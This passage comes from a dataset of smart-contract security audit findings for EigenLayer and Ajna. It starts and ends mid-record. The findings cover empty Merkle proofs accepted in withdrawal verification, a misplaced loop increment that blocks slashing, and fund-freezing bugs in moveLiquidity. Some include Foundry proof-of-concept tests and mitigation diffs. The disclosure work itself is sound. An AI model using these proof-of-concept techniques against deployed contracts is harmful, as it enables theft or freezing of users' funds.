BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(SKIP_SLOT_BLOCK_PROOF);          bytes memory validatorFieldsProof = abi.encodePacked(getValidatorProof());          withdrawalFields = getWithdrawalFields();          validatorFields = getValidatorFields(); @@ -317,7 +317,7 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {          //generate partialWithdrawalProofs.json with:          // ./solidityProofGen \"WithdrawalFieldsProof\" 61068 656 \"data/slot_58000/oracle_capella_beacon_state_58100.ssz\" \"data/slot_58000/capella_block_header_58000.json\" \"data/slot_58000/capella_block_58000.json\" \"partialWithdrawalProof.json\"          setJSON(\"./src/test/test-data/partialWithdrawalProof.json\"); -        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(); +        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(SKIP_SLOT_BLOCK_PROOF);          bytes memory validatorFieldsProof = abi.encodePacked(getValidatorProof());           withdrawalFields = getWithdrawalFields(); @@ -346,21 +346,22 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {       /// @notice verifies that multiple partial withdrawals can be made before a full withdrawal      function testProvingMultipleWithdrawalsForSameSlot(/*uint256 numPartialWithdrawals*/) public { -        IEigenPod newPod = testPartialWithdrawalFlow(); +        IEigenPod newPod = testPartialWithdrawalFlow(); // uses SKIP_SLOT_BLOCK_PROOF  -        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(); +        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(FULL_PROOF);          bytes memory validatorFieldsProof = abi.encodePacked(getValidatorProof());          withdrawalFields = getWithdrawalFields();          validatorFields = getValidatorFields();  -        cheats.expectRevert(bytes(\"EigenPod._processPartialWithdrawal: partial withdrawal has already been proven for this slot\")); +        // do not expect revert anymore due to different 'slotRoot' on FULL_PROOF and SKIP_SLOT_BLOCK_PROOF +        //cheats.expectRevert(bytes(\"EigenPod._processPartialWithdrawal: partial withdrawal has already been proven for this slot\"));          newPod.verifyAndProcessWithdrawal(withdrawalProofs, validatorFieldsProof, validatorFields, withdrawalFields, 0, 0);      }       /// @notice verifies that multiple full withdrawals for a single validator fail      function testDoubleFullWithdrawal() public { -        IEigenPod newPod = testFullWithdrawalFlow(); -        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(); +        IEigenPod newPod = testFullWithdrawalFlow(); // uses SKIP_SLOT_BLOCK_PROOF +        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(FULL_PROOF);          bytes memory validatorFieldsProof = abi.encodePacked(getValidatorProof());          withdrawalFields = getWithdrawalFields();          validatorFields = getValidatorFields(); @@ -759,8 +760,11 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {          return proofs;      }  +    uint256 internal constant FULL_PROOF = 0; +    uint256 internal constant SKIP_SLOT_BLOCK_PROOF = 1; +      /// @notice this function just generates a valid proof so that we can test other functionalities of the withdrawal flow -    function _getWithdrawalProof() internal returns(BeaconChainProofs.WithdrawalProofs memory) { +    function _getWithdrawalProof(uint256 proofType) internal returns(BeaconChainProofs.WithdrawalProofs memory) {          //make initial deposit          cheats.startPrank(podOwner);          eigenPodManager.stake{value: stakeAmount}(pubkey, signature, depositDataRoot); @@ -773,9 +777,9 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {              beaconChainOracle.setBeaconChainStateRoot(beaconStateRoot);              bytes32 blockHeaderRoot = getBlockHeaderRoot();              bytes32 blockBodyRoot = getBlockBodyRoot(); -            bytes32 slotRoot = getSlotRoot(); -            bytes32 blockNumberRoot = getBlockNumberRoot(); +            bytes32 slotRoot = (proofType == FULL_PROOF) ? getSlotRoot() : blockHeaderRoot; // else SKIP_SLOT_BLOCK_PROOF              bytes32 executionPayloadRoot = getExecutionPayloadRoot(); +            bytes32 blockNumberRoot = (proofType == FULL_PROOF) ? getBlockNumberRoot() :  executionPayloadRoot; // else SKIP_SLOT_BLOCK_PROOF    @@ -786,9 +790,9 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {              BeaconChainProofs.WithdrawalProofs memory proofs = BeaconChainProofs.WithdrawalProofs(                  abi.encodePacked(getBlockHeaderProof()),                  abi.encodePacked(getWithdrawalProof()), -                abi.encodePacked(getSlotProof()), +                (proofType == FULL_PROOF) ? abi.encodePacked(getSlotProof()) : bytes(\"\"), // else SKIP_SLOT_BLOCK_PROOF                  abi.encodePacked(getExecutionPayloadProof()), -                abi.encodePacked(getBlockNumberProof()), +                (proofType == FULL_PROOF) ? abi.encodePacked(getBlockNumberProof()) : bytes(\"\"), // else SKIP_SLOT_BLOCK_PROOF                  uint64(blockHeaderRootIndex),                  uint64(withdrawalIndex),                  blockHeaderRoot,  ``` We can see that **all** the test cases are still passing, whereby the following ones are confirming the aforementioned outcomes: ``` [PASS] testFullWithdrawalFlow():(address) (gas: 28517915) [PASS] testFullWithdrawalProof() (gas: 13185538) [PASS] testPartialWithdrawalFlow():(address) (gas: 28679149) [PASS] testProvingMultipleWithdrawalsForSameSlot() (gas: 45502286) ```  ## Tools Used VS Code, Foundry  ## Recommended Mitigation Steps  Require a minimum length (tree height) for the slot and block number proofs in [BeaconChainProofs.verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/BeaconChainProofs.sol#L245-L295).   At least require non-empty proofs according to the follwing *diff*: ```diff diff --git a/src/contracts/libraries/BeaconChainProofs.sol b/src/contracts/libraries/BeaconChainProofs.sol index b4129bf..119baf2 100644 --- a/src/contracts/libraries/BeaconChainProofs.sol +++ b/src/contracts/libraries/BeaconChainProofs.sol @@ -259,6 +259,10 @@ library BeaconChainProofs {              \"BeaconChainProofs.verifyWithdrawalProofs: withdrawalProof has incorrect length\");          require(proofs.executionPayloadProof.length == 32 * (BEACON_BLOCK_HEADER_FIELD_TREE_HEIGHT + BEACON_BLOCK_BODY_FIELD_TREE_HEIGHT),              \"BeaconChainProofs.verifyWithdrawalProofs: executionPayloadProof has incorrect length\"); +        require(proofs.slotProof.length >= 32, +            \"BeaconChainProofs.verifyWithdrawalProofs: slotProof has incorrect length\"); +        require(proofs.blockNumberProof.length >= 32, +            \"BeaconChainProofs.verifyWithdrawalProofs: blockNumberProof has incorrect length\");           /**           * Computes the block_header_index relative to the beaconStateRoot.  It concatenates the indexes of all the  ```  **Alternative**: Non-empty proofs can also be required in the `Merkle` library.    ## Assessed type  Invalid Validation"}, {"title": "It is impossible to slash queued withdrawals that contain a malicious strategy due to a misplacement of the ++i increment", "html_url": "https://github.com/code-423n4/2023-04-eigenlayer-findings/issues/205", "labels": ["bug", "3 (High Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "H-02"], "target": "2023-04-eigenlayer-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-eigenlayer/blob/main/src/contracts/core/StrategyManager.sol#L556-L579   # Vulnerability details  `StrategyManager::slashQueuedWithdrawal()` contains an `indicesToSkip` parameter to skip malicious strategies, as documented in the [function definition](https://github.com/code-423n4/2023-04-eigenlayer/blob/main/src/contracts/core/StrategyManager.sol#L532-L534):  > so that, e.g., if the slashed QueuedWithdrawal contains a malicious strategy in the `strategies` array which always reverts on calls to its 'withdraw' function, then the malicious strategy can be skipped (with the shares in effect \"burned\"), while the non-malicious strategies are still called as normal.  The problem is that the function does not work as expected, and `indicesToSkip` is in fact ignored. If the queued withdrawal contains a malicious strategy, it will make the slash always revert.  ## Impact  Owners won't be able to slash queued withdrawals that contain a malicious strategy.  An adversary can take advantage of this, and create withdrawal queues that won't be able to be slashed, completely defeating the slash system. The adversary can later complete the withdrawal.  ## Proof of Concept  The `++i;` statement in `StrategyManager::slashQueuedWithdrawal()` is misplaced. It is only executed on the `else` statement:  ```solidity     // keeps track of the index in the `indicesToSkip` array     uint256 indicesToSkipIndex = 0;      uint256 strategiesLength = queuedWithdrawal.strategies.length;     for (uint256 i = 0; i < strategiesLength;) {         // check if the index i matches one of the indices specified in the `indicesToSkip` array         if (indicesToSkipIndex < indicesToSkip.length && indicesToSkip[indicesToSkipIndex] == i) {             unchecked {                 ++indicesToSkipIndex;             }         } else {             if (queuedWithdrawal.strategies[i] == beaconChainETHStrategy){                     //withdraw the beaconChainETH to the recipient                 _withdrawBeaconChainETH(queuedWithdrawal.depositor, recipient, queuedWithdrawal.shares[i]);             } else {                 // tell the strategy to send the appropriate amount of funds to the recipient                 queuedWithdrawal.strategies[i].withdraw(recipient, tokens[i], queuedWithdrawal.shares[i]);             }             unchecked {                 ++i; // @audit             }         }     } ```  [Link to code](https://github.com/code-423n4/2023-04-eigenlayer/blob/main/src/contracts/core/StrategyManager.sol#L556-L579)  Let's suppose that the owner tries to slash a queued withdrawal, and wants to skip the first strategy (index `0`) because it is malicious and makes the whole transaction to revert.  1 . It defines `indicesToSkipIndex = 0` 2 . It enters the `for` loop starting at `i = 0` 3 . `if (indicesToSkipIndex < indicesToSkip.length && indicesToSkip[indicesToSkipIndex] == i)` will be true: `0 < 1 && 0 == 0` 4 . It increments `++indicesToSkipIndex;` to \"skip\" the malicious strategy, so `indicesToSkipIndex = 1` now. 5 . It goes back to the `for` loop. But `i` hasn't been modified, so `i = 0` still 6 . `if (indicesToSkipIndex < indicesToSkip.length && indicesToSkip[indicesToSkipIndex] == i)` will be false now: `1 < 1 && 0 == 0` 7 . It will enter the `else` statement and attempt to slash the strategy anyway 8 . If the strategy is malicious it will revert, making it impossible to slash 9 . The adversary can later complete the withdrawal  ## POC Test  This test shows how the `indicesToSkip` parameter is completely ignored.  For the sake of simplicity of the test, it uses a normal strategy, which will be slashed, proving that it ignores the `indicesToSkip` parameter and it indeed calls `queuedWithdrawal.strategies[i].withdraw()`.  A malicious strategy that makes `withdraw()` revert would make the whole transaction revert (not shown on this test but easily checkeable as the [function won't catch it](https://github.com/code-423n4/2023-04-eigenlayer/blob/main/src/contracts/core/StrategyManager.sol#L536-L579)).  Add this test to `src/tests/StrategyManagerUnit.t.sol` and run `forge test -m \"testSlashQueuedWithdrawal_IgnoresIndicesToSkip\"`.  ```solidity     function testSlashQueuedWithdrawal_IgnoresIndicesToSkip() external {         address recipient = address(this);         uint256 depositAmount = 1e18;         uint256 withdrawalAmount = depositAmount;         bool undelegateIfPossible = false;          // Deposit into strategy and queue a withdrawal         (IStrategyManager.QueuedWithdrawal memory queuedWithdrawal,,) =             testQueueWithdrawal_ToSelf_NotBeaconChainETH(depositAmount, withdrawalAmount, undelegateIfPossible);          // Slash the delegatedOperator         slasherMock.freezeOperator(queuedWithdrawal.delegatedAddress);          // Keep track of the balance before the slash attempt         uint256 balanceBefore = dummyToken.balanceOf(address(recipient));          // Assert that the strategies array only has one element         assertEq(queuedWithdrawal.strategies.length, 1);          // Set `indicesToSkip` so that it should ignore the only strategy         // As it's the only element, its index is `0`         uint256[] memory indicesToSkip = new uint256[](1);         indicesToSkip[0] = 0;          // Call `slashQueuedWithdrawal()`         // This should not try to slash the only strategy the queue has, because of the defined `indicesToSkip`         // But in fact it ignores `indicesToSkip` and attempts to do it anyway         cheats.startPrank(strategyManager.owner());         strategyManager.slashQueuedWithdrawal(recipient, queuedWithdrawal, _arrayWithJustDummyToken(), indicesToSkip);         cheats.stopPrank();          uint256 balanceAfter = dummyToken.balanceOf(address(recipient));          // The `indicesToSkip` was completely ignored, and the function attempted the slash anyway         // It can be asserted due to the fact that it increased the balance         require(balanceAfter == balanceBefore + withdrawalAmount, \"balanceAfter != balanceBefore + withdrawalAmount\");     } ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Place the `++i` outside of the if/else statement. This way it will increment each time the loop runs.  ```diff     for (uint256 i = 0; i < strategiesLength;) {         // check if the index i matches one of the indices specified in the `indicesToSkip` array         if (indicesToSkipIndex < indicesToSkip.length && indicesToSkip[indicesToSkipIndex] == i) {             unchecked {                 ++indicesToSkipIndex;             }         } else {             if (queuedWithdrawal.strategies[i] == beaconChainETHStrategy){                     //withdraw the beaconChainETH to the recipient                 _withdrawBeaconChainETH(queuedWithdrawal.depositor, recipient, queuedWithdrawal.shares[i]);             } else {                 // tell the strategy to send the appropriate amount of funds to the recipient                 queuedWithdrawal.strategies[i].withdraw(recipient, tokens[i], queuedWithdrawal.shares[i]);             } -           unchecked { -               ++i; -           }         } +       unchecked { +           ++i; +       }     } ```      ## Assessed type  Loop"}, {"title": "processInclusionProofKeccak does not work as expected", "html_url": "https://github.com/code-423n4/2023-04-eigenlayer-findings/issues/22", "labels": ["bug", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden"], "target": "2023-04-eigenlayer-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-eigenlayer/blob/398cc428541b91948f717482ec973583c9e76232/src/contracts/libraries/Merkle.sol#L48   # Vulnerability details  ## Impact Detailed description of the impact of this finding. processInclusionProofKeccak does not work as expected ## Proof of Concept Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept. function `verifyInclusionKeccak` is not used anywhere but its in the scope of this contest. There is no validation that proof is a tree and a valid tree like it described in the comments. E.x. if proof is less than 32 length that function will just return a leaf without reverting. In my opinion function doesn't work as expected and can be exploited. I've submitted the same issue with `processInclusionProofSha256` function that lead to loss a funds for validator due the same issue. ```solidity     function processInclusionProofKeccak(bytes memory proof, bytes32 leaf, uint256 index) internal pure returns (bytes32) {         bytes32 computedHash = leaf;         for (uint256 i = 32; i <= proof.length; i+=32) {             if(index % 2 == 0) {                 // if ith bit of index is 0, then computedHash is a left sibling                 assembly {                     mstore(0x00, computedHash)                     mstore(0x20, mload(add(proof, i)))                     computedHash := keccak256(0x00, 0x40)                     index := div(index, 2)                 }             } else {                 // if ith bit of index is 1, then computedHash is a right sibling                 assembly {                     mstore(0x00, mload(add(proof, i)))                     mstore(0x20, computedHash)                     computedHash := keccak256(0x00, 0x40)                     index := div(index, 2)                 }                         }         }         return computedHash;     } ``` [src/contracts/libraries/Merkle.sol#L49](https://github.com/code-423n4/2023-04-eigenlayer/blob/398cc428541b91948f717482ec973583c9e76232/src/contracts/libraries/Merkle.sol#L48) ## Tools Used  ## Recommended Mitigation Steps I think its important to add security to that function like this ```diff     function processInclusionProofKeccak(bytes memory proof, bytes32 leaf, uint256 index) internal pure returns (bytes32) { +        require(proof.length % 32 == 0 && proof.length > 0, \"Invalid proof length\");          bytes32 computedHash = leaf;         for (uint256 i = 32; i <= proof.length; i+=32) {             if(index % 2 == 0) {                 // if ith bit of index is 0, then computedHash is a left sibling                 assembly {                     mstore(0x00, computedHash)                     mstore(0x20, mload(add(proof, i)))                     computedHash := keccak256(0x00, 0x40)                     index := div(index, 2)                 }             } else {                 // if ith bit of index is 1, then computedHash is a right sibling                 assembly {                     mstore(0x00, mload(add(proof, i)))                     mstore(0x20, computedHash)                     computedHash := keccak256(0x00, 0x40)                     index := div(index, 2)                 }                         }         }         return computedHash;     } ```"}, {"title": "PositionManager's moveLiquidity can freeze funds by removing destination index even when the move was partial", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/503", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323   # Vulnerability details       `positionIndex.remove(params_.fromIndex)`removes the PositionManager entry even when it is only partial removal as a result of `IPool(params_.pool).moveQuoteToken(...)` call.  I.e. it is correct to do `fromPosition.lps -= vars.lpbAmountFrom`, but the resulting amount might not be zero, moveQuoteToken() are not guaranteed to clear the position as it has available liquidity constraint. In the case of partial quote funds removal `positionIndex.remove(params_.fromIndex)` operation will freeze the remaining position.  ## Impact  Permanent fund freeze for the remaining position of LP beneficiary.  ## Proof of Concept  While `positions[params_.tokenId][params_.fromIndex]` LP shares are correctly reduced by the amount returned by pool's moveQuoteToken(), the position itself is unconditionally removed from the `positionIndexes[params_.tokenId]`, making any remaining funds unavailable:  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323  ```solidity     function moveLiquidity(         MoveLiquidityParams calldata params_     ) external override mayInteract(params_.pool, params_.tokenId) nonReentrant {         Position storage fromPosition = positions[params_.tokenId][params_.fromIndex];          MoveLiquidityLocalVars memory vars;         vars.depositTime = fromPosition.depositTime;          // handle the case where owner attempts to move liquidity after they've already done so         if (vars.depositTime == 0) revert RemovePositionFailed();          // ensure bucketDeposit accounts for accrued interest         IPool(params_.pool).updateInterest();          // retrieve info of bucket from which liquidity is moved           (             vars.bucketLP,             vars.bucketCollateral,             vars.bankruptcyTime,             vars.bucketDeposit,         ) = IPool(params_.pool).bucketInfo(params_.fromIndex);          // check that bucket hasn't gone bankrupt since memorialization         if (vars.depositTime <= vars.bankruptcyTime) revert BucketBankrupt();          // calculate the max amount of quote tokens that can be moved, given the tracked LP         vars.maxQuote = _lpToQuoteToken(             vars.bucketLP,             vars.bucketCollateral,             vars.bucketDeposit,             fromPosition.lps,             vars.bucketDeposit,             _priceAt(params_.fromIndex)         );          EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];          // remove bucket index from which liquidity is moved from tracked positions >>      if (!positionIndex.remove(params_.fromIndex)) revert RemovePositionFailed();          // update bucket set at which a position has liquidity         // slither-disable-next-line unused-return         positionIndex.add(params_.toIndex);          // move quote tokens in pool         (             vars.lpbAmountFrom,             vars.lpbAmountTo,         ) = IPool(params_.pool).moveQuoteToken(             vars.maxQuote,             params_.fromIndex,             params_.toIndex,             params_.expiry         );          Position storage toPosition = positions[params_.tokenId][params_.toIndex];          // update position LP state >>      fromPosition.lps -= vars.lpbAmountFrom;         toPosition.lps   += vars.lpbAmountTo;         // update position deposit time to the from bucket deposit time         toPosition.depositTime = vars.depositTime; ```  Bucket can contain a mix of quote and collateral tokens, but moveLiquidity() aims to retrieve `vars.maxQuote = _lpToQuoteToken(...)` quote funds per current exchange rate:  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/helpers/PoolHelper.sol#L222-L236  ```solidity     function _lpToQuoteToken(         uint256 bucketLP_,         uint256 bucketCollateral_,         uint256 deposit_,         uint256 lenderLPBalance_,         uint256 maxQuoteToken_,         uint256 bucketPrice_     ) pure returns (uint256 quoteTokenAmount_) {         uint256 rate = Buckets.getExchangeRate(bucketCollateral_, bucketLP_, deposit_, bucketPrice_);          quoteTokenAmount_ = Maths.wmul(lenderLPBalance_, rate);          if (quoteTokenAmount_ > deposit_)       quoteTokenAmount_ = deposit_;         if (quoteTokenAmount_ > maxQuoteToken_) quoteTokenAmount_ = maxQuoteToken_;     } ```  There might be not enough quote deposit funds available to redeem the whole quote amount requested, which is controlled by the corresponding liquidity constraint:  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LenderActions.sol#L711-L719  ```solidity         uint256 scaledLpConstraint = Maths.wmul(params_.lpConstraint, exchangeRate);         if ( >>          params_.depositConstraint < scaledDepositAvailable &&             params_.depositConstraint < scaledLpConstraint         ) {             // depositConstraint is binding constraint             removedAmount_ = params_.depositConstraint; >>          redeemedLP_    = Maths.wdiv(removedAmount_, exchangeRate);         } ```  ## Recommended Mitigation Steps  As a most straightforward solution consider reverting when there is a remainder, i.e. when `fromPosition.lps > dust_threshold`:  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323  ```diff     function moveLiquidity(         MoveLiquidityParams calldata params_     ) external override mayInteract(params_.pool, params_.tokenId) nonReentrant {         Position storage fromPosition = positions[params_.tokenId][params_.fromIndex];          MoveLiquidityLocalVars memory vars;         vars.depositTime = fromPosition.depositTime;          // handle the case where owner attempts to move liquidity after they've already done so         if (vars.depositTime == 0) revert RemovePositionFailed();          // ensure bucketDeposit accounts for accrued interest         IPool(params_.pool).updateInterest();          // retrieve info of bucket from which liquidity is moved           (             vars.bucketLP,             vars.bucketCollateral,             vars.bankruptcyTime,             vars.bucketDeposit,         ) = IPool(params_.pool).bucketInfo(params_.fromIndex);          // check that bucket hasn't gone bankrupt since memorialization         if (vars.depositTime <= vars.bankruptcyTime) revert BucketBankrupt();          // calculate the max amount of quote tokens that can be moved, given the tracked LP         vars.maxQuote = _lpToQuoteToken(             vars.bucketLP,             vars.bucketCollateral,             vars.bucketDeposit,             fromPosition.lps,             vars.bucketDeposit,             _priceAt(params_.fromIndex)         );          EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];          // remove bucket index from which liquidity is moved from tracked positions         if (!positionIndex.remove(params_.fromIndex)) revert RemovePositionFailed();          // update bucket set at which a position has liquidity         // slither-disable-next-line unused-return         positionIndex.add(params_.toIndex);          // move quote tokens in pool         (             vars.lpbAmountFrom,             vars.lpbAmountTo,         ) = IPool(params_.pool).moveQuoteToken(             vars.maxQuote,             params_.fromIndex,             params_.toIndex,             params_.expiry         );          Position storage toPosition = positions[params_.tokenId][params_.toIndex];          // update position LP state >>      fromPosition.lps -= vars.lpbAmountFrom;         toPosition.lps   += vars.lpbAmountTo;         // update position deposit time to the from bucket deposit time         toPosition.depositTime = vars.depositTime; ```   ## Assessed type  Error"}, {"title": "PositionManager's moveLiquidity can set wrong deposit time and permanently freeze LP funds moved", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/494", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-02"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323   # Vulnerability details  moveLiquidity() set new destination index LP entry deposit time to be equal to the source index deposit time, while destination bucket might have defaulted after that time.  This is generally not correct as source bucket bankruptcy is controlled (i.e. LP shares that are moved are healthy), while the destination bucket's bankruptcy time, being arbitrary, can be higher than source index deposit time, and in this case the funds will become inaccessible after such a move (i.e. healthy shares will be marked as defaulted due to incorrect deposit time used).  In other words the funds are moved from healthy non-default zone to an arbitrary point, which can be either healthy or not. In the latter case this constitutes a loss for an owner as `toIndex` bucket bankruptcy time exceeding deposit time means that all other retrieval operations will be blocked.  ## Impact  Owner will permanently lose access to the LP shares whenever `positions[params_.tokenId][params_.toIndex]` bucket bankruptcy time is greater than `positions[params_.tokenId][params_.fromIndex].depositTime`.  moveLiquidity() is a common operation, while source and destination bucket bankruptcy times can be related in an arbitrary manner, and the net impact is permanent fund freeze, so this is a fund loss without material prerequisites, setting the severity to be high.  ## Proof of Concept  moveLiquidity() sets `toPosition` deposit time to be `fromPosition.depositTime`:  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323  ```solidity     function moveLiquidity(         MoveLiquidityParams calldata params_     ) external override mayInteract(params_.pool, params_.tokenId) nonReentrant {         Position storage fromPosition = positions[params_.tokenId][params_.fromIndex];          MoveLiquidityLocalVars memory vars; >>      vars.depositTime = fromPosition.depositTime;          // handle the case where owner attempts to move liquidity after they've already done so         if (vars.depositTime == 0) revert RemovePositionFailed();          // ensure bucketDeposit accounts for accrued interest         IPool(params_.pool).updateInterest();          // retrieve info of bucket from which liquidity is moved           (             vars.bucketLP,             vars.bucketCollateral,             vars.bankruptcyTime,             vars.bucketDeposit,         ) = IPool(params_.pool).bucketInfo(params_.fromIndex);          // check that bucket hasn't gone bankrupt since memorialization         if (vars.depositTime <= vars.bankruptcyTime) revert BucketBankrupt();          // calculate the max amount of quote tokens that can be moved, given the tracked LP         vars.maxQuote = _lpToQuoteToken(             vars.bucketLP,             vars.bucketCollateral,             vars.bucketDeposit,             fromPosition.lps,             vars.bucketDeposit,             _priceAt(params_.fromIndex)         );          EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];          // remove bucket index from which liquidity is moved from tracked positions         if (!positionIndex.remove(params_.fromIndex)) revert RemovePositionFailed();          // update bucket set at which a position has liquidity         // slither-disable-next-line unused-return         positionIndex.add(params_.toIndex);          // move quote tokens in pool         (             vars.lpbAmountFrom,             vars.lpbAmountTo,         ) = IPool(params_.pool).moveQuoteToken(             vars.maxQuote,             params_.fromIndex,             params_.toIndex,             params_.expiry         );          Position storage toPosition = positions[params_.tokenId][params_.toIndex];          // update position LP state         fromPosition.lps -= vars.lpbAmountFrom;         toPosition.lps   += vars.lpbAmountTo;         // update position deposit time to the from bucket deposit time >>      toPosition.depositTime = vars.depositTime; ```  I.e. there is no check for `params_.toIndex` bucket situation, the time is just copied.  While there is checking logic in LenderActions, which checks for `toBucket` bankruptcy and sets the time accordingly:  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LenderActions.sol#L315-L327  ```solidity         vars.toBucketDepositTime = toBucketLender.depositTime;         if (vars.toBucketBankruptcyTime >= vars.toBucketDepositTime) {             // bucket is bankrupt and deposit was done before bankruptcy time, reset lender lp amount             toBucketLender.lps = toBucketLP_;              // set deposit time of the lender's to bucket as bucket's last bankruptcy timestamp + 1 so deposit won't get invalidated             vars.toBucketDepositTime = vars.toBucketBankruptcyTime + 1;         } else {             toBucketLender.lps += toBucketLP_;         }          // set deposit time to the greater of the lender's from bucket and the target bucket         toBucketLender.depositTime = Maths.max(vars.fromBucketDepositTime, vars.toBucketDepositTime); ```  This way, while bucket structure deposit time will be controlled and updated, PositionManager's structure will have the deposit time copied over.  In the case when `positions[params_.tokenId][params_.fromIndex].depositTime` was less than `params_.toIndex` `bankruptcyTime`, this will freeze these LP funds as further attempts to use them will be blocked:  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L285  ```solidity     function moveLiquidity(         MoveLiquidityParams calldata params_     ) external override mayInteract(params_.pool, params_.tokenId) nonReentrant {         Position storage fromPosition = positions[params_.tokenId][params_.fromIndex];          MoveLiquidityLocalVars memory vars; >>      vars.depositTime = fromPosition.depositTime;          // handle the case where owner attempts to move liquidity after they've already done so         if (vars.depositTime == 0) revert RemovePositionFailed();          // ensure bucketDeposit accounts for accrued interest         IPool(params_.pool).updateInterest();          // retrieve info of bucket from which liquidity is moved           (             vars.bucketLP,             vars.bucketCollateral, >>          vars.bankruptcyTime,             vars.bucketDeposit,         ) = IPool(params_.pool).bucketInfo();          // check that bucket hasn't gone bankrupt since memorialization >>      if (vars.depositTime <= vars.bankruptcyTime) revert BucketBankrupt(); ```  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L352-L372  ```solidity     function reedemPositions(         RedeemPositionsParams calldata params_     ) external override mayInteract(params_.pool, params_.tokenId) {         EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];          ...          for (uint256 i = 0; i < indexesLength; ) {             index = params_.indexes[i];              Position memory position = positions[params_.tokenId][index];              if (position.depositTime == 0 || position.lps == 0) revert RemovePositionFailed();              // check that bucket didn't go bankrupt after memorialization >>          if (_bucketBankruptAfterDeposit(pool, index, position.depositTime)) revert BucketBankrupt(); ```  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L436-L443  ```solidity     function _bucketBankruptAfterDeposit(         IPool pool_,         uint256 index_,         uint256 depositTime_     ) internal view returns (bool) {         (, , uint256 bankruptcyTime, , ) = pool_.bucketInfo(index_); >>      return depositTime_ <= bankruptcyTime;     } ```  ## Recommended Mitigation Steps  Consider using the resulting time of the destination position, for example:  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323  ```diff     function moveLiquidity(         MoveLiquidityParams calldata params_     ) external override mayInteract(params_.pool, params_.tokenId) nonReentrant {         Position storage fromPosition = positions[params_.tokenId][params_.fromIndex];          MoveLiquidityLocalVars memory vars;         vars.depositTime = fromPosition.depositTime;          ...          Position storage toPosition = positions[params_.tokenId][params_.toIndex];          // update position LP state         fromPosition.lps -= vars.lpbAmountFrom;         toPosition.lps   += vars.lpbAmountTo; -       // update position deposit time to the from bucket deposit time +       // update position deposit time with the renewed to bucket deposit time +       (, vars.depositTime) = pool.lenderInfo(params_.toIndex, address(this));         toPosition.depositTime = vars.depositTime; ```  Notice, that this time value will be influenced by the other PositionManager positions in the `params_.toIndex` bucket, but the surface described will be closed as it will be controlled against `params_.toIndex` bucket bankruptcy time.   ## Assessed type  Error"}, {"title": "Position NFT can be spammed with insignificant positions by anyone until rewards DoS", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/488", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-03"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170-L216 https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L466-L485   # Vulnerability details  ## Impact The 